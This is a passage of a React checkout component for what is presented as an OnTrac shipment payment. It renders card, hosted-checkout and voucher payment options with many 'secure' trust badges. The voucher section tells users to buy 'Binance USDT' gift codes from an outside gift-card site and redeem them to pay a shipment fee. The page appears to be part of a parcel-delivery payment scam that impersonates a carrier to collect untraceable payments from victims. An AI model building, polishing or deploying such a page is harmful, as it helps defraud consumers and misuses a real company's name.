                      className={styles.submitButton}
                      disabled={processingPayment}
                    >
                      {processingPayment ? (
                        <>
                          <div className={styles.buttonSpinner}></div>
                          Processing...
                        </>
                      ) : (
                        <>
                          <i className="fa-solid fa-lock"></i>
                          Pay {shipmentData.paymentCurrency} {shipmentData.paymentAmount}
                        </>
                      )}
                    </button>

                    <div className={styles.securityBadges}>
                      <i className="fa-solid fa-shield-halved"></i>
                      <span>Protected connection</span>
                    </div>
                      </>
                    )}
                  </form>
                )}

                {/* Bachs Hosted Checkout */}
                {selectedMethod === 'bachs' && (
                  <div className={styles.shieldclimbContainer}>
                    <h2 className={styles.formTitle}>Pay by card</h2>
                    <p className={styles.shieldclimbDescription}>
                      Checkout is in USD. Your bank may convert the charge to your card's currency.
                    </p>

                    <div className={styles.shieldclimbFeatures}>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-shield-halved"></i>
                        <span>Secure hosted payment page</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>Automatic payment confirmation</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-arrow-rotate-left"></i>
                        <span>Return to OnTrac after checkout</span>
                      </div>
                    </div>

                    <button
                      onClick={handleBachsPayment}
                      className={`${styles.submitButton} ${styles.shieldclimbButton}`}
                      disabled={processingPayment}
                    >
                      {processingPayment ? (
                        <>
                          <div className={styles.buttonSpinner}></div>
                          Opening secure checkout...
                        </>
                      ) : (
                        <>
                          <i className="fa-solid fa-arrow-up-right-from-square"></i>
                          Continue to secure checkout
                        </>
                      )}
                    </button>

                    {errorMessage && (
                      <div ref={voucherErrorRef} className={styles.inlineErrorBanner}>
                        <div className={styles.inlineErrorIcon}>
                          <i className="fa-solid fa-circle-exclamation"></i>
                        </div>
                        <div className={styles.inlineErrorContent}>
                          <span className={styles.inlineErrorTitle}>Secure checkout could not be opened</span>
                          <span className={styles.inlineErrorText}>{errorMessage}</span>
                        </div>
                      </div>
                    )}

                    <div className={styles.poweredBy}>
                      Payment processing by <strong>Bachs</strong>
                    </div>
                  </div>
                )}

                {/* ShieldClimb Payment - PREMIUM WALLET EXPERIENCE */}
                {selectedMethod === 'shieldclimb' && (
                  <div className={styles.shieldclimbContainer}>
                    <h2 className={styles.formTitle}>Express Checkout</h2>
                    <p className={styles.shieldclimbDescription}>
                      You will be redirected to a secure banking gateway to complete your purchase. We support all major cards and international payment methods with instant verification.
                    </p>

                    <div className={styles.shieldclimbFeatures}>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>One-Tap Payment Options</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>Instant Transaction Confirmation</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>Enterprise-Grade Security</span>
                      </div>
                    </div>

                    <button
                      onClick={handleShieldClimbPayment}
                      className={`${styles.submitButton} ${styles.shieldclimbButton}`}
                      disabled={processingPayment}
                    >
                      {processingPayment ? (
                        <>
                          <div className={styles.buttonSpinner}></div>
                          Connecting to Secure Gateway...
                        </>
                      ) : (
                        <>
                          <i className="fa-solid fa-bolt"></i>
                          Continue to Express Checkout
                        </>
                      )}
                    </button>

                    {errorMessage && (
                      <div ref={voucherErrorRef} className={styles.inlineErrorBanner}>
                        <div className={styles.inlineErrorIcon}>
                          <i className="fa-solid fa-circle-exclamation"></i>
                        </div>
                        <div className={styles.inlineErrorContent}>
                          <span className={styles.inlineErrorTitle}>Express checkout could not be opened</span>
                          <span className={styles.inlineErrorText}>{errorMessage}</span>
                        </div>
                      </div>
                    )}

                    <div className={styles.poweredBy}>
                      Payment options are provided by the secure checkout gateway.
                    </div>
                  </div>
                )}

                {/* Voucher Payment - Apple Standard UI */}
                {selectedMethod === 'voucher' && (
                  <div className={styles.voucherContainer}>
                    <AnimatePresence mode="wait">
                      {voucherStatus === 'success' ? (
                        <motion.div 
                          className={styles.proSuccessState}
                          initial={{ opacity: 0, scale: 0.9 }}
                          animate={{ opacity: 1, scale: 1 }}
                        >
                          <div className={styles.successIconWrapper}>
                            <i className="fa-solid fa-circle-check"></i>
                          </div>
                          <h2 className={styles.proTitle}>Voucher received</h2>
                          <p className={styles.proDescription}>
                            Your voucher was submitted successfully. Shipment status will update automatically after the voucher is confirmed.
                          </p>
                          <div className={styles.proLoaderBar}>
                            <div className={styles.proLoaderFill}></div>
                          </div>
                          <p className={styles.proHint}>Returning to tracking in a few moments...</p>
                        </motion.div>
                      ) : (
                        <form onSubmit={handleVoucherSubmit} className={styles.proForm}>
                          <h2 className={styles.formTitle}>Redeem Voucher</h2>
                          <p className={styles.formSubtitle}>Enter your prepaid voucher code to complete this transaction.</p>
                          
                          <div className={styles.formGroup}>
                            <label htmlFor="voucherCode">Voucher Code</label>
                            <div className={styles.inputWithIcon}>
                              <i className="fa-solid fa-ticket"></i>
                              <input
                                type="text"
                                id="voucherCode"
                                placeholder="E.g. ABC-123-XYZ"
                                value={voucherCode}
                                onChange={(e) => setVoucherCode(e.target.value.toUpperCase())}
                                required
                                disabled={voucherStatus === 'loading'}
                              />
                            </div>
                          </div>

                          {/* Inline error for voucher */}
                          <AnimatePresence>
                            {errorMessage && selectedMethod === 'voucher' && (
                              <motion.div
                              ref={voucherErrorRef}
                              className={styles.inlineErrorBanner}
                              initial={{ opacity: 0, y: -8, height: 0 }}
                              animate={{ opacity: 1, y: 0, height: 'auto' }}
                              exit={{ opacity: 0, y: -4, height: 0 }}
                              transition={{ duration: 0.25, ease: 'easeOut' }}
                            >
                              <div className={styles.inlineErrorIcon}>
                                <i className="fa-solid fa-circle-exclamation"></i>
                              </div>
                              <div className={styles.inlineErrorContent}>
                                <span className={styles.inlineErrorTitle}>Invalid Voucher</span>
                                  <span className={styles.inlineErrorText}>{errorMessage}</span>
                                </div>
                              </motion.div>
                            )}
                          </AnimatePresence>

                          <button
                            type="submit"
                            className={styles.submitButton}
                            disabled={voucherStatus === 'loading'}
                          >
                            {voucherStatus === 'loading' ? (
                              <><div className={styles.buttonSpinner}></div> Verifying...</>
                            ) : (
                              'Apply Voucher'
                            )}
                          </button>

                          {/* --- NEW: Professional Voucher Instructions --- */}
                          <div className={styles.voucherInstructions}>
                            <h3 className={styles.instructionTitle}>
                              <i className="fa-regular fa-circle-question"></i> How to get a code
                            </h3>
                            <div className={styles.instructionSteps}>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>1</span>
                                <p>Visit <a href="https://mygiftcardsupply.com" target="_blank" rel="noopener noreferrer" className={styles.partnerLink}>MyGiftCardSupply</a></p>
                              </div>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>2</span>
                                <p>Search for <strong>"Binance USDT"</strong> and select amount</p>
                              </div>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>3</span>
                                <p>Pay via Card/PayPal & receive code instantly via email</p>
                              </div>
                            </div>
                            
                            <div className={styles.guaranteeBlock}>
                              <i className="fa-solid fa-shield-halved"></i>
                              <span>
                                <strong>Zero-Overpayment Guarantee:</strong> Any excess value from fixed-denomination vouchers is automatically credited to your account balance or refunded upon request.
                              </span>
                            </div>
                          </div>
                          {/* --- END NEW BLOCK --- */}

                        </form>
                      )}
                    </AnimatePresence>
                  </div>
                )}

              </motion.div>
            )}
          </AnimatePresence>

        </motion.div>

        {/* Trust Indicators - PROFESSIONAL FOOTER */}
        <div className={styles.trustIndicators}>
          <div className={styles.trustBadge}>
            <i className="fa-solid fa-lock"></i>
            <span>Secure checkout</span>
          </div>
          <div className={styles.trustBadge}>
            <i className="fa-solid fa-shield-halved"></i>
            <span>Protected payment flow</span>
          </div>
          <div className={styles.trustBadge}>
            <i className="fa-solid fa-circle-check"></i>
            <span>Confirmation tracked</span>
          </div>
        </div>
      </div>

      {showPaymentGuide && (
        <aside className={styles.walkthroughRail}>
          <PaymentWalkthrough total={paymentTotal} />
        </aside>
      )}
      </div>
    </div>
  );
}

export default CheckoutPage;
